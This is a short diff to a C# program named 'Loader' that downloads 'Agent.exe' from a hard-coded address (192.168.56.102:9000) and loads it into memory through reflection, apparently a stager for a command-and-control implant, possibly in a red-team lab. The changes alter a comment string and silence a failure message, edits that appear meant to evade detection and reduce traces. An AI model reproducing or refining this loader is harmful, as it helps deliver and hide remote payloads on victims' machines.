@@ -3,7 +3,7 @@ using System.Net;
 using System.Reflection;
 using System.Runtime.InteropServices;
 
-// this is to load agent via assembly.load
+// this is to load ayyyyygent via assembly.load
 namespace Loader
 {
     public class Program
@@ -22,7 +22,7 @@ namespace Loader
 
         public static void Main()
         {
-            if (!HelloTest()) { System.Console.WriteLine("Hello failed"); return; }
+            if (!HelloTest()) { return; }
             var data = DownloadAttemptOne("http://192.168.56.102:9000/Agent.exe");
             if (data == null) { return; }
             if (!LoadAttemptOne(data)) { return; }
